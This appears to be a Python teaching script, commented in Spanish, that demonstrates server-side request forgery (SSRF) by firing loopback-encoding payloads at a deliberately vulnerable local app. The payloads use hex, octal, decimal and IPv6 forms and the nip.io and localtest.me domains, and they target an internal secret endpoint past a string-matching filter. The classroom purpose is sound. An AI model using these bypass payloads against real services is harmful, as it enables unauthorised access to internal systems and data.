"""
attack_demo.py
--------------
Demuestra como el filtro basado en regex/string de vulnerable_app.py
puede ser evadido usando representaciones alternativas de 127.0.0.1.

Requisito: tener vulnerable_app.py corriendo en http://localhost:5000

Correr:
    python attack_demo.py
"""

import requests

TARGET = "http://localhost:5000/fetch"

# 127.0.0.1 expresado de formas que el regex no reconoce como "127.0.0.1".
#
# OJO: estos payloads dependen de que el RESOLVER DE RED del sistema
# interprete la notacion numerica alternativa (hex/octal/decimal) como IP.
# Eso lo hacen curl, los navegadores y a veces la libc de Linux, pero
# Python (socket.getaddrinfo) en WINDOWS es estricto y los trata como
# nombre de dominio -> da NameResolutionError, NO 403. Esa inconsistencia
# entre parsers es justamente el punto de la clase. Los marcados
# [fragil] pueden fallar por resolucion de DNS en vez de por el filtro.
PAYLOADS = {
    # --- Control ---
    "Control: IP literal (deberia bloquearse)":  "http://127.0.0.1:5000/internal/secret",
    # el filtro SI reconoce "127.0.0.1" tal cual, asi que este deberia dar 403.
    # Sirve para confirmar que el filtro esta activo antes de intentar bypassearlo.

    # --- Bypasses numericos [fragil]: dependen del parser del SO/libreria ---
    "[fragil] Hexadecimal":                       "http://0x7f000001:5000/internal/secret",
    # 0x7f000001 en hexadecimal = 2130706433 en decimal = 127.0.0.1 en IP.
    # El regex busca el string "127.0.0.1" y no reconoce esta forma.

    "[fragil] Octal":                             "http://0177.0.0.1:5000/internal/secret",
    # "0177" con el 0 adelante se interpreta como octal: 0o177 = 127 en decimal.
    # Osea "0177.0.0.1" tambien equivale a 127.0.0.1 para algunos parsers.

    "[fragil] Decimal (entero de 32 bits)":       "http://2130706433:5000/internal/secret",
    # Una IP tambien se puede escribir como UN SOLO numero de 32 bits
    # (los 4 octetos concatenados en binario y leidos como entero).
    # 2130706433 = 127.0.0.1 escrito como un unico entero decimal.

    "[fragil] IPv6 en hex puro (sin '127.0.0.1')": "http://[::ffff:7f00:1]:5000/internal/secret",
    # Forma "IPv4-mapped IPv6": ::ffff:7f00:1 representa la IPv4 127.0.0.1
    # pero escrita en hexadecimal puro dentro de una direccion IPv6
    # (7f00:1 en hex = 127.0.0.1 en decimal). No contiene el substring
    # "127.0.0.1" en ningun lado, asi que el regex no lo detecta.

    "IPv6 loopback":                              "http://[::1]:5000/internal/secret",
    # "::1" es el loopback en IPv6 (equivalente a 127.0.0.1 en IPv4).
    # Los corchetes [ ] son obligatorios en una URL cuando el host es IPv6.

    "Punto final (fully qualified)":              "http://127.0.0.1.:5000/internal/secret",
    # El punto final convierte el nombre en un "FQDN" (fully qualified domain
    # name) segun la sintaxis DNS; muchos sistemas lo tratan igual que sin
    # el punto, pero como STRING es distinto de "127.0.0.1" y el regex
    # (que busca ese substring exacto) puede no matchear segun como este
    # escrito el patron.

    # --- Bypass SIN tocar nada en tu maquina: usa DNS PUBLICO real ---
    # nip.io y localtest.me son servicios de DNS wildcard publicos que
    # resuelven a 127.0.0.1. Como la resolucion es DNS de verdad (no
    # notacion numerica), funcionan igual en Windows, Mac y Linux.
    # Requieren que la maquina que corre este script tenga internet
    # (el fetch real al puerto 5000 sigue siendo local).
    "DNS publico con guiones (nip.io)":           "http://127-0-0-1.nip.io:5000/internal/secret",
    # nip.io interpreta los numeros separados por GUIONES en el subdominio
    # como los octetos de una IP, y responde esa misma IP por DNS.
    # El string no tiene puntos entre los numeros, asi que no matchea
    # el patron r"127\.0\.0\.1" (que exige puntos literales).

    "DNS publico directo (localtest.me)":         "http://localtest.me:5000/internal/secret",
    # localtest.me (y todos sus subdominios) resuelven siempre a 127.0.0.1
    # por DNS publico. Ni siquiera hace falta ningun truco de formato: el
    # nombre de dominio en si no contiene ningun substring bloqueado.
}

def main():
    print(f"Atacando {TARGET}\n" + "-" * 60)
    for name, payload in PAYLOADS.items():
        try:
            # params={"url": payload} hace que requests arme la query string
            # automaticamente (y la escape/encode si hace falta), equivalente
            # a pegarle "?url=<payload-encodeado>" a TARGET.
            r = requests.get(TARGET, params={"url": payload}, timeout=5)
            # Si el filtro bloqueo, vulnerable_app.py responde 403.
            # Si lo dejo pasar y pudo hacer el fetch, responde 200.
            bypass = r.status_code == 200
            marca = "BYPASS ✅" if bypass else "bloqueado"
            print(f"[{marca}] {name}")
            print(f"    url:  {payload}")
            print(f"    resp: {r.status_code} {r.text[:120]}\n")  # [:120] corta la respuesta para que no inunde la consola
        except Exception as e:
            # Esto captura, por ejemplo, el NameResolutionError de Windows
            # cuando el payload no se pudo resolver como host (ver nota
            # arriba sobre los payloads [fragil]).
            print(f"[error] {name}: {e}\n")

if __name__ == "__main__":
    main()
